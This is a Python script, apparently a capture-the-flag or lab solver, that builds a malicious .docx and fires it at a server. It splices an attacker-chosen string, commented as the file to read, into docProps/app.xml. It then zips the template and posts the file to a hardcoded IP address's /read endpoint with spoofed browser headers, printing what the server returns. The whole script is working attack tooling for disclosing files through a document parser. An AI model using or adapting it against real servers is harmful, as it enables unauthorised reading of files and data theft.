import os
import requests
import shutil
import sys

if len(sys.argv) < 2:
	print("not enough params")
	exit()

# file to read as parameter
inject = sys.argv[1]

# inject filename in app.xml
with open("tpl_app.xml", "r") as f:
	text = f.read()

idx = text.index("$derp$")
text = text[:idx] + inject + text[idx+6:]

with open("template/docProps/app.xml", "w") as f:
	f.write(text)

# zip it all
shutil.make_archive("test", 'zip', './template')

# rename as docx
os.rename('test.zip', 'test.docx')

# upload
CONF = {"headers": {}}
CONF['headers']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
CONF['headers']['Accept-Language'] = "en-US,en;q=0.5"
CONF['headers']['Referer'] = "http://163.172.67.183/"

# debug using proxy
http_proxy  = "http://127.0.0.1:8080"
proxies = {"http"  : http_proxy }

files = {'file': ("test.docx", open('test.docx','rb'), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
r = requests.post("http://163.172.67.183/read", files=files, headers=CONF["headers"]) #, proxies=proxies)

# read result
print(r.status_code)
print(r.text)
